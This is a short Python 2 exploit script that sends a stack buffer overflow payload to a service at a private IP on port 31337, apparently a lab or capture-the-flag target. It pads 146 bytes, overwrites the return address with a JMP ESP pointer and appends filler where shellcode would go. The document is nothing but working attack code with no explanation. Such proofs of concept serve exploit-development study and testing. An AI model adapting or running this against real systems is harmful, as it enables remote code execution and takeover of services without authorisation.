import socket
import struct
ip="192.168.11.130"
port=31337


ptr_jmp_esp = 0x080414c3

payload =  "A" * 146 + struct.pack("<I", ptr_jmp_esp) + "C" * (1024-150)

print "Sending %s bytes payload"%len(payload)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
s.send(payload)
s.send("\n")
